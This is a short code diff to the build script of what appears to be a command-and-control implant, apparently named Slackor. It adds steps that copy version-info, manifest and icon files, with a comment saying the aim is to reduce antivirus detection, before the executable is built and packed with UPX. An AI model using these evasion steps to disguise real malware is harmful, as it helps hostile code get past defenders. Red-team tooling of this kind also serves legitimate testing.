@@ -2,6 +2,7 @@ import random
 import sqlite3
 import hashlib
 import subprocess
+import os.path
 
 conn = sqlite3.connect('slackor.db')
 
@@ -20,6 +21,14 @@ for row in channels:
     registration = row[3]
 
 conn.close()
+
+# Reduce A/V detection by having valid looking versioninfo
+if not os.path.exists("versioninfo.json"):
+    subprocess.run(["bash", "-c", "cp -p versioninfo.example.json versioninfo.json"])
+if not os.path.exists("versioninfo.manifest"):
+    subprocess.run(["bash", "-c", "cp -p versioninfo.example.manifest versioninfo.manifest"])
+if not os.path.exists("icon.ico"):
+    subprocess.run(["bash", "-c", "cp -p icon.example.ico icon.ico"])
 
 # Build exe and pack with UPX
 subprocess.run(["bash", "-c", "GO111MODULE=on go generate"])
